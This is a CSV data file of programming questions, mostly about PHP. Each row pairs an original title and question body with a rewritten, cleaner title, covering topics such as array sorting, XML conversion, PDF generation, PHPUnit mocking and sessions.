originalTitle,body,reformulatedTitle
How do I sort a multidimensional array in php," I have CSV data loaded into a multidimensional array. In this way each ""row"" is a record and each ""column"" contains the same type of data. I am using the function below to load my CSV file. I need to be able to specify a column to sort so that it rearranges the rows. One of the columns contains date information in the format of Y-m-d H:i:s and I would like to be able to sort with the most recent date being the first row. <code>  function f_parse_csv($file, $longest, $delimiter){ $mdarray = array(); $file = fopen($file, ""r""); while ($line = fgetcsv($file, $longest, $delimiter)) { array_push($mdarray, $line); } fclose($file); return $mdarray;}",How do I Sort a Multidimensional Array in PHP
PHP Associative arrays to and from XML ," Is there an easy way to marshal a PHP associative array to and from XML? For example, I have the following array: How would I turn it into something similar to the following XML in as few lines as possible, then back again? I don't really care if I have to change the array structure a bit or if the XML that comes out is different to the above example. I've been trying to work with PHP's XMLReader and XMLWriter, but the documentation is so poor and the code I've produced as a consequence looks nothing like what I feel it should look like: Does it really have to be any harder than that to get a basic, raw XML dump of a PHP array without writing my own custom class?I try to avoid PEAR. In addition to the configuration headaches I've had with it, I've never stuck with any of the packages I've ever used from it. <code>  $items = array(""1"", ""2"", array( ""item3.1"" => ""3.1"", ""item3.2"" => ""3.2"" ""isawesome"" => true )); <items> <item>1</item> <item>2</item> <item> <item3_1>3.1</item3_1> <item3_2>3.2</item3_2> <isawesome>true</isawesome> </item></items> $xml = SomeXMLWriter::writeArrayToXml($items);$array = SomeXMLWriter::writeXmlToArray($xml);",Passing PHP associative arrays to and from XML 
Php Is a directory writable, Does anyone know how I can check to see if a directory is writeable in PHP? The function is_writable doesn't work for folders. Edit: It does work. See the accepted answer. <code> ,How do I check if a directory is writeable in PHP?
PHP: How to check if a directory is writeable?, Does anyone know how I can check to see if a directory is writeable in PHP? The function is_writable doesn't work for folders. Edit: It does work. See the accepted answer. <code> ,How do I check if a directory is writeable in PHP?
"In need for a site, which explains how to use PHPUnit", I am searching for a tutorial (optimally with Zend Framework) on how to use PHPUnit.I have found a couple on google but have not quiet understood it yet. <code> ,In need for a site that explains how to use PHPUnit
Asynchronous PHP calls?," Is there a way in PHP to make asynchronous HTTP calls? I don't care about the response, I just want to do something like file_get_contents(), but not wait for the request to finish before executing the rest of my code. This would be super useful for setting off ""events"" of a sort in my application, or triggering long processes.Any ideas? <code> ",How to make asynchronous HTTP requests in PHP
Best practices in PHP and MySQL with international strings," It often happens that characters such as gets transformed to , even though the collation for the MySQL DB, table and field is set to utf8_general_ci. The encoding in the Content-Type for the page is also set to UTF8.I know about utf8_encode/decode, but I'm not quite sure about where and how to use it.I have read the ""The Absolute Minimum Every Software Developer Absolutely, Positively Must Know About Unicode and Character Sets (No Excuses!)"" article, but I need some MySQL / PHP specific pointers.How do I ensure that user entered data containing international characters doesn't get corrupted? <code> ",How do I ensure that user entered data containing international characters doesn't get corrupted?
Best way to get result count before LIMIT was applied in PHP/postgres," When paging through data that comes from a DB, you need to know how many pages there will be to render the page jump controls.Currently I do that by running the query twice, once wrapped in a count() to determine the total results, and a second time with a limit applied to get back just the results I need for the current page.This seems inefficient. Is there a better way to determine how many results would have been returned before LIMIT was applied?I am using PHP and Postgres. <code> ",Best way to get result count before LIMIT was applied
Best way to get result count before LIMIT was applied in PHP/PostgreSQL," When paging through data that comes from a DB, you need to know how many pages there will be to render the page jump controls.Currently I do that by running the query twice, once wrapped in a count() to determine the total results, and a second time with a limit applied to get back just the results I need for the current page.This seems inefficient. Is there a better way to determine how many results would have been returned before LIMIT was applied?I am using PHP and Postgres. <code> ",Best way to get result count before LIMIT was applied
PHPUnit - Unit Testing with items that need to send headers," I'm currently working with PHPUnit to try and develop tests alongside what I'm writing, however, I'm currently working on writing the Session Manager, and am having issues doing so...The constructor for the Session handling class is However, as PHPUnit sends out text before it starts the testing, any testing on this Object returns a failed test, as the HTTP ""Headers"" have been sent... <code>  private function __construct(){ if (!headers_sent()) { session_start(); self::$session_id = session_id(); }}",Unit Testing with items that need to send headers
WWW::Mechanize equivilent for PHP?," I'm looking for a library that has functionality similar to Perl's WWW::Mechanize, but for PHP. Basically, it should allow me to submit HTTP GET and POST requests with a simple syntax, and then parse the resulting page and return in a simple format all forms and their fields, along with all links on the page.I know about CURL, but it's a little too barebones, and the syntax is pretty ugly (tons of curl_foo($curl_handle, ...) statementsClarification:I want something more high-level than the answers so far. For example, in Perl, you could do something like: To do the same thing using HTTP_Client or wget or CURL would be a lot of work, I'd have to manually parse the pages to find the links, find the form URL, extract all the hidden fields, and so on. The reason I'm asking for a PHP solution is that I have no experience with Perl, and I could probably build what I need with a lot of work, but it would be much quicker if I could do the above in PHP. <code>  # navigate to the main page$mech->get( 'http://www.somesite.com/' ); # follow a link that contains the text 'download this'$mech->follow_link( text_regex => qr/download this/i );# submit a POST form, to log into the site$mech->submit_form( with_fields => { username => 'mungo', password => 'lost-and-alone', });# save the results as a file$mech->save_content('somefile.zip');",Is there a PHP equivalent of Perl's WWW::Mechanize?
Odd permissions on file modified by PHP move&#95;uploaded&#95;file()," I'm running PHP 5.2.6 on a Windows Server 2003 Enterprise box. IIS is set to deny anonymous access and use Integrated Windows authentication.I'm using a PHP script to save a file uploaded from a web form. The file is uploaded to a temp folder, the script creates a file name and path depending on other variables from the web form, and then the script uses PHP's move_uploaded_file() to move the temp file to the final location. All that works fine. In short, people are uploading files so everyone in the group can see them and the files are organized by the script.My problem is that the file in the final location has odd permissions. It is not ending up with permissions from either the temp location or the final location. Both the temp location and final location have the same permissions: full rights for owner and administrations; read and read/execute for 2 specific AD security groups. The final file ends up with only: full rights for owner and administrations. So while the admins and the original uploader have no problem viewing the file, all others in the group get ""permission denied"" when trying to access it.Any ideas or suggestions will be greatly appreciated! Thanks! <code> ",Odd permissions on file modified by PHP move_uploaded_file()
PHP print_r() equivalent in Perl," I find print_r in PHP extremely useful, but wonder if there is anything remotely equivalent in Perl? <code> ",What is Perl's equivalent to PHP's print_r()?
Maintain PHP Session, I am looking for a way to maintain PHP sessions across multiple domains on the same server. I am going to be integrating my sites with a Simple Machines Forum so I will need to use MySQL based sessions. Thanks! <code> ,How do I maintain PHP sessions across multiple domains on the same server?
MediaWiki: How are the image paths calculated?," I have a Perl application that parses MediaWiki SQL tables and displays data from multiple wiki pages. I need to be able to re-create the absolute image path to display the images, eg: .../f/fc/Herbs.jpg/300px-Herbs.jpg From MediaWiki Manual: Image_Authorisation: ""the [image] path can be calculated easily from the file name and..."" How is the path calculated?  <code> ",How does MediaWiki compose the image paths?
Whats the reasonings behind the different brace forms?," I'm reading through the Zend Framework coding standards, where they state that curly brace after a Class definitions should be on the next line, the ""one true brace form"". I usually have the braces on the same line: What's the reason for putting the brace on the next line? Or using any other style, for that matter? <code>  class MyClass{ function....} class OtherClass { function ...}",Whats the reasoning behind the different brace forms?
jqGrid table is empty," I'm trying to create a jqgrid, but the table is empty. The table renders, but the data doesn't show.The data I'm getting back from the php call is: The javascript configuration looks like so: The HTML looks like: I'm not sure that I needed to define jsonReader, since I've tried to keep to the default. If the php code will help, I can post it too. <code>  {""page"":""1"",""total"":1,""records"":""10"",""rows"":[{""id"":""2:1"",""cell"":[""1"",""image"",""Chief Scout"",""Highest Award test"",""0""]},{""id"":""2:2"",""cell"":[""2"",""image"",""Link Badge"",""When you are invested as a Scout, you may be eligible to receive a Link Badge. (See page 45)"",""0""]},{""id"":""2:3"",""cell"":[""3"",""image"",""Pioneer Scout"",""Upon completion of requirements, the youth is invested as a Pioneer Scout"",""0""]},{""id"":""2:4"",""cell"":[""4"",""image"",""Voyageur Scout Award"",""Voyageur Scout Award is the right after Pioneer Scout."",""0""]},{""id"":""2:5"",""cell"":[""5"",""image"",""Voyageur Citizenship"",""Learning about and caring for your community."",""0""]},{""id"":""2:6"",""cell"":[""6"",""image"",""Fish and Wildlife"",""Demonstrate your knowledge and involvement in fish and wildlife management."",""0""]},{""id"":""2:7"",""cell"":[""7"",""image"",""Photography"",""To recognize photography knowledge and skills"",""0""]},{""id"":""2:8"",""cell"":[""8"",""image"",""Recycling"",""Demonstrate your knowledge and involvement in Recycling"",""0""]},{""id"":""2:10"",""cell"":[""10"",""image"",""Voyageur Leadership "",""Show leadership ability"",""0""]},{""id"":""2:11"",""cell"":[""11"",""image"",""World Conservation"",""World Conservation Badge"",""0""]}]} $(""#""+tableId).jqGrid ({ url:'getAwards.php?id='+classId, dataType : 'json', mtype:'POST', colNames:['Id','Badge','Name','Description',''], colModel : [ {name:'awardId', width:30, sortable:true, align:'center'}, {name:'badge', width:40, sortable:false, align:'center'}, {name:'name', width:180, sortable:true, align:'left'}, {name:'description', width:380, sortable:true, align:'left'}, {name:'selected', width:0, sortable:false, align:'center'} ], sortname: ""awardId"", sortorder: ""asc"", pager: $('#'+tableId+'_pager'), rowNum:15, rowList:[15,30,50], caption: 'Awards', viewrecords:true, imgpath: 'scripts/jqGrid/themes/green/images', jsonReader : { root: ""rows"", page: ""page"", total: ""total"", records: ""records"", repeatitems: true, cell: ""cell"", id: ""id"", userdata: ""userdata"", subgrid: {root:""rows"", repeatitems: true, cell:""cell"" } }, width: 700, height: 200}); <table class=""awardsList"" id=""awardsList2"" class=""scroll"" name=""awardsList"" /><div id=""awardsList2_pager"" class=""scroll""></div>",jqGrid with JSON data renders table as empty
How can I get PHPUnit MockObjects to return differernt values based on a parameter?," I've got a PHPUnit mock object that returns 'return value' no matter what its arguments: What I want to be able to do is return a different value based on the arguments passed to the mock method. I've tried something like: But this causes PHPUnit to complain if the mock isn't called with the argument 'two', so I assume that the definition of methodToMock('two') overwrites the definition of the first.So my question is: Is there any way to get a PHPUnit mock object to return a different value based on its arguments? And if so, how? <code>  // From inside a test...$mock = $this->getMock('myObject', 'methodToMock');$mock->expects($this->any)) ->method('methodToMock') ->will($this->returnValue('return value')); $mock = $this->getMock('myObject', 'methodToMock');// methodToMock('one')$mock->expects($this->any)) ->method('methodToMock') ->with($this->equalTo('one')) ->will($this->returnValue('method called with argument ""one""'));// methodToMock('two')$mock->expects($this->any)) ->method('methodToMock') ->with($this->equalTo('two')) ->will($this->returnValue('method called with argument ""two""'));",How can I get PHPUnit MockObjects to return different values based on a parameter?
"php: capturing linebreaks (newline,linefeed) characters in a textarea"," I have a form with a <textarea> and I want to capture any line breaks in that textarea on the server-side, and replace them with a <br/>.Is that possible?I tried setting white-space:pre on the textarea's CSS, but it's still not enough. <code> ","Capturing linebreaks (newline,linefeed) characters in a textarea"
How do I format a number to a dollar amount, How do you convert a number to a string showing dollars and cents? <code>  eg:123.45 => '$123.45'123.456 => '$123.46'123 => '$123.00'.13 => '$0.13'.1 => '$0.10'0 => '$0.00',How do I format a number to a dollar amount in PHP
"Simple ""Long Polling"" example code?"," I can find lots of information on how Long Polling works (For example, this, and this), but no simple examples of how to implement this in code.All I can find is cometd, which relies on the Dojo JS framework, and a fairly complex server system..Basically, how would I use Apache to serve the requests, and how would I write a simple script (say, in PHP) which would ""long-poll"" the server for new messages?The example doesn't have to be scaleable, secure or complete, it just needs to work! <code> ","How do I implement basic ""Long Polling""?"
"How to implement basic ""Long Polling""?"," I can find lots of information on how Long Polling works (For example, this, and this), but no simple examples of how to implement this in code.All I can find is cometd, which relies on the Dojo JS framework, and a fairly complex server system..Basically, how would I use Apache to serve the requests, and how would I write a simple script (say, in PHP) which would ""long-poll"" the server for new messages?The example doesn't have to be scaleable, secure or complete, it just needs to work! <code> ","How do I implement basic ""Long Polling""?"
PHP: exec() error responses?," Below is the command I tried executing, without success: When you add a die() at the end, it catches that there's an error: For the above exec() statement, a permissions problem is causing the error, but PHP isn't displaying it. How do you display from PHP what error is occurring? <code>  exec('ln -s ' . PLUGIN_DIR . '/.htaccess ' . ABSPATH . '/.htaccess'); exec('ln -s ' . PLUGIN_DIR . '/.htaccess ' . ABSPATH . '/.htaccess') or die('what?!');",How to retrieve PHP exec() error responses?
PHP Flush: How Often and Best Practises," I just finished reading this post: https://developer.yahoo.com/performance/rules.html#flush and have already implemented a flush after the top portion of my page loads (head, css, top banner/search/nav).Is there any performance hit in flushing? Is there such a thing as doing it too often? What are the best practices?If I am going to hit an external API for data, would it make sense to flush before hand so that the user isn't waiting on that data to come back, and can at least get some data before hand? <code> ",PHP Flush: How Often and Best Practices
"covert to pdf, with linux or php?", I want to display documents on my website. The server is hosted on a Debian machine. I was thinking I can allow the upload of support documents then use a Linux app or PHP app to convert the doc into PDF and display that in an HTML page. Are there any APIs or binaries that allow me to do this? <code> ,How to convert documents to PDF on a Linux/PHP stack?
Convert HTML + CSS to PDF with PHP?," I have an HTML (not XHTML) document that renders fine in Firefox 3 and IE 7. It uses fairly basic CSS to style it and renders fine in HTML.I'm now after a way of converting it to PDF. I have tried:DOMPDF: it had huge problems with tables. I factored out my large nested tables and it helped (before it was just consuming up to 128M of memory then dying--thats my limit on memory in php.ini) but it makes a complete mess of tables and doesn't seem to get images. The tables were just basic stuff with some border styles to add some lines at various points;HTML2PDF and HTML2PS: I actually had better luck with this. It rendered some of the images (all the images are Google Chart URLs) and the table formatting was much better but it seemed to have some complexity problem I haven't figured out yet and kept dying with unknown node_type() errors. Not sure where to go from here; andHtmldoc: this seems to work fine on basic HTML but has almost no support for CSS whatsoever so you have to do everything in HTML (I didn't realize it was still 2001 in Htmldoc-land...) so it's useless to me.I tried a Windows app called Html2Pdf Pilot that actually did a pretty decent job but I need something that at a minimum runs on Linux and ideally runs on-demand via PHP on the Webserver.What am I missing, or how can I resolve this issue? <code> ",How Can I add HTML And CSS Into PDF
Convert HTML + CSS to PDF," I have an HTML (not XHTML) document that renders fine in Firefox 3 and IE 7. It uses fairly basic CSS to style it and renders fine in HTML.I'm now after a way of converting it to PDF. I have tried:DOMPDF: it had huge problems with tables. I factored out my large nested tables and it helped (before it was just consuming up to 128M of memory then dying--thats my limit on memory in php.ini) but it makes a complete mess of tables and doesn't seem to get images. The tables were just basic stuff with some border styles to add some lines at various points;HTML2PDF and HTML2PS: I actually had better luck with this. It rendered some of the images (all the images are Google Chart URLs) and the table formatting was much better but it seemed to have some complexity problem I haven't figured out yet and kept dying with unknown node_type() errors. Not sure where to go from here; andHtmldoc: this seems to work fine on basic HTML but has almost no support for CSS whatsoever so you have to do everything in HTML (I didn't realize it was still 2001 in Htmldoc-land...) so it's useless to me.I tried a Windows app called Html2Pdf Pilot that actually did a pretty decent job but I need something that at a minimum runs on Linux and ideally runs on-demand via PHP on the Webserver.What am I missing, or how can I resolve this issue? <code> ",How Can I add HTML And CSS Into PDF
Fastest way to retrive a <title> in PHP, I'm doing a bookmarking system and looking for the fastest (easiest) way to retrieve a page's title with PHP. It would be nice to have something like $title = page_title($url) <code> ,Fastest way to retrieve a <title> in PHP
Fastest way to implode an associative array with keys.," I'm looking for a fast way to turn an associative array in to a string. Typical structure would be like a URL query string but with customizable separators so I can use '&amp;' for xhtml links or '&' otherwise.My first inclination is to use foreach but since my method could be called many times in one request I fear it might be too slow. Is there a faster way? <code>  <?php$Amp = $IsXhtml ? '&amp;' : '&';$Parameters = array('Action' => 'ShowList', 'Page' => '2');$QueryString = '';foreach ($Parameters as $Key => $Value) $QueryString .= $Amp . $Key . '=' . $Value;",Fastest way to implode an associative array with keys
prevent direct access to a php include file.," I have a php file which I will be using as exclusively as an include. Therefore I would like to throw an error instead of executing it when it's accessed directly by typing in the URL instead of being included.Basically I need to do a check as follows in the php file: Is there an easy way to do this? <code>  if ( $REQUEST_URL == $URL_OF_CURRENT_PAGE ) die (""Direct access not premitted"");",Prevent direct access to a php include file
How to extract Images from a file?," I need to extract all the images from a PDF file on my server. I don't want the PDF pages, only the images at their original size and resolution.How could I do this with Perl, PHP or any other UNIX based app (which I would invoke with the exec function from PHP)? <code> ",How can I extract images from a PDF file?
How to extract Images from a PDF file?," I need to extract all the images from a PDF file on my server. I don't want the PDF pages, only the images at their original size and resolution.How could I do this with Perl, PHP or any other UNIX based app (which I would invoke with the exec function from PHP)? <code> ",How can I extract images from a PDF file?
How can I extract Images from a PDF file?," I need to extract all the images from a PDF file on my server. I don't want the PDF pages, only the images at their original size and resolution.How could I do this with Perl, PHP or any other UNIX based app (which I would invoke with the exec function from PHP)? <code> ",How can I extract images from a PDF file?
Regex on sprintf input field," I have an input field where both regular text and sprintf tags can be entered.Example: some text here. %1$s done %2$d timesHow do I validate the sprintf parts so its not possible them wrong like %$1s ?The text is utf-8 and as far as I know regex only match latin-1 characters.www.regular-expressions.info does not list /u anywhere, which I think is used to tell that string is unicode.Is the best way to just search the whole input field string for % or $ and if either found then apply the regex to validate the sprintf parts ?I think the regex would be: /%\d\$(s|d|u|f)/u <code> ",Validate sprintf format from input field with regex
PHP: get classname from static call in extended class.," I have two classes: Action and MyAction. The latter is declared as: All I need is method in the Action class (only in it, because there will be a lot of inherited classes, and I dont want to implement this method in all of them), which will return classname from a static call. Here is what Im talking about: And when I call it: But each declaration in the parent class has access only to the parent class __CLASS__ variable, which has the value Action.Is there any possible way to do this? <code>  class MyAction extends Action {/* some methods here */} Class Action { function n(){/* something */}} MyAction::n(); // it should return ""MyAction""",How can I get the classname from a static call in an extended PHP class?
Google Financial Api how get stock quotes, I'm looking for access to financial data from Google services. I found this URL that gets the stock data for Microsoft.What are all the possible parameters that Google allows for this kind of HTTP request? I'd like to see all the different information that I could get. <code> ,How can I get stock quotes using Google Finance API?
"PHP Curl , extract a XML response", I am invoking PHP cURL method on a server and the response is XML type. cURL is saving the output (after removing the tags) in a scalar type variable. Is there a way to store it in an object/hash/array so that it's easy to parse? <code> ,"PHP cURL, extract an XML response"
inserting mm/dd/yyyy format in MYSQL, How can I insert an MM/DD/YYYY format date into an MySQL database using PHP? <code> ,Inserting mm/dd/yyyy format dates in MySQL
"In PHP, what is the differences between NULL and setting a string to equal 2 single quotes."," I used to set things like this when I wanted blank values. Then after some months, I decided this looked better and had a clearer intent. This worked without hiccup for a while, but recently with a PDO prepared statements I ran into a problem. Binding a value to null made the query fail, whilst binding it to '' did not. I needed to bind it to null, so that if a condition was met, it would insert blank data.What are the differences between the 2? I still think equaling null (or at least a constant) looks better, so should I do this? <code>  $blankVar = ''; $blankVar = null; define('EMPTY', '');","In PHP, what is the differences between NULL and setting a string to equal 2 single quotes"
What is the best way to generate a key within PHP?," I'm looking to create a reusable function that will generate a random key with printable ACSII characters of chosen length (anywhere from 2 to 1000+). I'm thinking printable ASCII characters would be 33-126. They key does not need to be completely unique, just unique if generated at the exact same millisecond (so uniqid() won't work).I'm thinking a combination of chr() and mt_rand() might work.Is this the way to go, or is something else the best method?Edit: uniqid() will also not work because it doesn't have a length parameter, it's just whatever PHP gives you.My Idea: This is what I came up with: Are there any problems with this?Another Edit: Most of the other questions deal with password generation. I want a wider variety of characters and I don't care about 1 vs l. I want the maximum number of possible keys to be possible.Note: the generated key does not necessarily have to be cryptographically secure. <code>  function GenerateKey($length = 16) { $key = ''; for($i = 0; $i < $length; $i ++) { $key .= chr(mt_rand(33, 126)); } return $key;}",What is the best way to generate a random key within PHP?
Is there a solution to this FPDF/FPDI error when using templates: FPDF error: Unable to find xref table.," I am trying to add an existing PDF (created otherwise) to a PDF created with FPDF using FPDI. It seems to work find for most PDFs, but I get the following error: After some testing, I figured out that if I use a PDF version of 1.4 or lower (Acrobat v5 or lower) it seems to work. Looking at the file it seems to be because of a different PDF format.Is there a work around or solution to this? I have probably 10 000+ PDFs uploaded by users, some of the new working, some of them not. It's also annoying that FPDI just dies instead of causing some kind of error or even returning falseThe only solution I can think of right now is to parse the first line of the PDF file to determine the version and only add the ones that over versions that will work.Edit:I also tried this in Zend_Pdf and it had the following result, using the demo file that comes with the Zend Framework: Is it impossible to parse PDFs greater than 1.4? <code>  FPDF error: Unable to find xref table. Fatal error: Uncaught exception 'Zend_Pdf_Exception' with message 'Cross-reference streams are not supported yet.' in /Volumes/Documents/temp/ZendFramework-1.7.7/library/Zend/Pdf/Parser.php:331Stack trace:#0 /Volumes/Documents/temp/ZendFramework-1.7.7/library/Zend/Pdf/Parser.php(455): Zend_Pdf_Parser->_loadXRefTable('116')#1 /Volumes/Documents/temp/ZendFramework-1.7.7/library/Zend/Pdf.php(297): Zend_Pdf_Parser->__construct('/Volumes/Docume...', Object(Zend_Pdf_ElementFactory_Proxy), true)#2 /Volumes/Documents/temp/ZendFramework-1.7.7/library/Zend/Pdf.php(250): Zend_Pdf->__construct('/Volumes/Docume...', NULL, true)#3 /Volumes/Documents/temp/ZendFramework-1.7.7/demos/Zend/Pdf/demo.php(37): Zend_Pdf::load('/Volumes/Docume...')#4 {main} thrown in /Volumes/Documents/temp/ZendFramework-1.7.7/library/Zend/Pdf/Parser.php on line 331",Is there a way to make FPDF/FPDI or Zend_Pdf support the parsing of PDFs greater than 1.4?
How do you find the last element of an array while iterating using a foreach loop in php ?," I am writing a SQL query creator using some parameters. In Java, it's very easy to detect the last element of an array from inside the for loop by just checking the current array position with the array length. In PHP they have non-integer indexes to access arrays. So you must iterate over an array using a foreach loop. This becomes problematic when you need to take some decision (in my case to append or/and parameter while building query). I am sure there must be some standard way of doing this. How do you solve this in PHP? <code>  for(int i=0; i< arr.length;i++){ boolean isLastElem = i== (arr.length -1) ? true : false; }",Find the last element of an array while using a foreach loop in PHP
PHP: Web Page Screenshots?," I know there is not a direct way to take a screen shot of a web page with PHP. What would be the most straightforward way to accomplish this? Are there any command line tools that could do this that I might be able to execute from a PHP script (I'm thinking something that would run in a 'NIX OS (OS X and/or Linux in particular)?Edit: Or maybe some sort of web service I could access via SOAP or REST or ...Edit #2: I found a related question discussing the CLI option, but I'd still be open to other methods if anyone knows of anything. <code> ",Web Page Screenshots with PHP?
Unicode in URL - works with PHP?," I would like to access a PHP file whose name has UTF-8 characters in it.The file does not have a BOM in it. It just contains an echo statement that displays a few unicode characters.Accessing the PHP page from the browser (FireFox 3.0.8, IE7) results in HTTP error 500.There are two entries in the Apache log (file is /.php; the letter is a composite one and corresponds to the characters \xe0\xae\x95 in the log below):[Sat Apr 04 09:30:25 2009] [error] [client 127.0.0.1] PHP Warning: Unknown: failed to open stream: No such file or directory in Unknown on line 0[Sat Apr 04 09:30:25 2009] [error] [client 127.0.0.1] PHP Fatal error: Unknown: Failed opening required 'D:/va/ROOT/\xe0\xae\x95.php' (include_path='.;C:\php5\pear') in Unknown on line 0The same page works when file and dir names are in English. In the same setup, there is no problem using SSI for these pages.EDITRemoved info on url rewriting since it does not seem to be a factor.When mod_rewrite is removed, the PHP file still does not work. Works if the file is renamed to a non-UTF name. However, shtml works even with UTF characters in file and/or path name. <code> ",Can a PHP file name (or a dir in its full path) have UTF-8 characters?
